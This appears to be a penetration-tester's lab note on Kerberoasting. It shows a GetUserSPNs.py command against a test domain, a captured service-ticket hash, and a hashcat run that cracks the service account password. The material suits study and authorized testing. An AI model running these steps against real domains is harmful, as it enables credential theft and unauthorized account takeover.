# getuserspns.py

For use with a [kerberoasting](../ad-authentication/kerberosting.md) attack once credentials for any user are known

Dump the Service Principal Names (SPNs) from the Domain Controller (DC), put the ticket hash into a file for a cracking attempt with [hashcat](../../password-attacks/hashcat.md) with module 13100

```
kali@kali:~ $ GetUserSPNs.py PLANETEXPRESS.local/hconrad:Password1 -dc-ip 192.168.56.108 -request
...
$krb5tgs$23$*sqlservice$PLANETEXPRESS.LOCAL$PLANETEXPRESS.local/sqlservice*$8bbbec...
...
kali@kali:~ $ hashcat -m 13100 spn-tgt.hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
...
...d7cb4c:MYpassword123#
```
